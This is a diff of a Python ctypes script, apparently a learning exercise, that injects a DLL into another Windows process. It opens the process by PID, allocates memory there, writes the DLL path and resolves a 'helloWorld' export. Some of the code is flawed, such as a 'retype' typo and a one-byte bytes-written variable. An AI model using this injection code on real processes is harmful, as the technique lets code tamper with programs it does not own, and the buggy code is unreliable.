@@ -1,24 +1,35 @@
 import sys
 from ctypes import *
 from ctypes import wintypes
+import ctypes
 
 PAGE_READWRITE          =   0X04
 PROCESS_ALL_ACCESS      =   ( 0x000F0000 | 0x00100000 | 0xFFF )
 VIRTUAL_MEM             =   ( 0x1000 | 0x2000 )
 
+BYTE      = c_ubyte
+WORD      = c_ushort
+DWORD     = c_ulong
+LPBYTE    = POINTER(c_ubyte)
+LPTSTR    = POINTER(c_char) 
+HANDLE    = c_void_p
+PVOID     = c_void_p
+LPVOID    = c_void_p
+UNIT_PTR  = c_ulong
+SIZE_T    = c_ulong
+
 kernel32 = windll.kernel32
 kernel32.GetModuleHandleW.restype = wintypes.HMODULE
 kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
+
+kernel32.WriteProcessMemory.retype = wintypes.BOOL
+kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, LPBYTE]
 
 pid = input("What is the PID of the process to inject the DLL to? ")
 print("The pid that was just entered is: %s" % pid)
 #pid     = sys.argv[1]
 dll_path    = sys.argv[1]
-dll_len     = len(dll_path)
-
-print("The dll_path is: %s" % dll_path)
-#print("The dll_len is: %s" % dll_len)
-
+dll_len = len(dll_path) * 2
 
 #Get a handle to the process we are injecting into
 h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid))
@@ -32,9 +43,11 @@ if not h_process:
 arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
 print ("[*] The address space allocated is: %s" % arg_address)
 
-#Write the DLL path into the allocated space
-written = c_int(0)
-kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
+
+#written = c_int(0)
+written = c_ubyte(0)
+bSuccess = kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
+
 
 h_kernel32 = kernel32.GetModuleHandleW('kernel32.dll')
 
@@ -66,5 +79,6 @@ h_exportedFunc = windll.kernel32.GetProcAddress(h_loadlib, b"helloWorld")
 if h_exportedFunc == False:
             error = GetLastError()
             print("ERROR with h_exportedFunc: %d - %s" % (error, FormatError(error)))
+
 else:
             print("[*] The address for the helloWorld handle is %s" % hex(h_exportedFunc))
